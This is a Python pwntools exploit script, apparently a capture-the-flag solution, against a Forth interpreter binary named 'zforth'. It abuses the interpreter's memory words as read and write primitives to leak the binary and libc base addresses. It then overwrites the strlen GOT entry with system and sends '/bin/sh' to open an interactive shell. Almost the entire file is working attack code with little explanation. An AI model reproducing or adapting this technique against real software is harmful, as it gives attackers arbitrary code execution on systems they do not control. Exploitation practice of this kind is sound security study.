from pwn import *


elf = ELF('./zforth', checksec=False)

libc = ELF("./libc-2.31.so", checksec=False)

p = remote(elf.path)
p.recvline()



def write_primitive(base_addr, content , addr, length):

    """

    > 20204 143 3 !!
    > 143 3 @@ .
    > 20204

    """
    payload = "%i %i %i !!" % (content, addr - base_addr, length)
    return payload

def read_primitive(base_addr, addr, length):
    """
    > 143 4 @@ .
    > 309357920
    """
    
    payload = "%i %i @@ ." % (addr-base_addr, length)
    return payload


# GET DICT ADDRESS AND BASE ADDR OF THE BINARY

payload = b"-300 4 @@ ."
p.sendline(payload)

dict_address = int(p.recvline().strip(), 0)
dict_address += 0x20

info("DICT @0x%hx" % dict_address)

elf.address = dict_address - 24992

info("PIE  @0x%hx" % elf.address)

# LEAK LIBC

printf_got = elf.got['printf']

payload = read_primitive(dict_address, printf_got, 4)
p.sendline(payload.encode())

printf_libc = int(p.recvline().strip(), 0)
printf_libc += 0x20


libc.address = printf_libc  - libc.sym['printf']


info("LIBC  @0x%hx" % libc.address)
  


success("STAGE 1 COMPLETED.")


system = libc.sym['system']
strlen_got = elf.got['strlen']


# Overwrite GOT


payload = write_primitive(dict_address, system , strlen_got , 4)
p.sendline(payload.encode())

p.sendline(b"/bin/sh bam")
p.interactive()
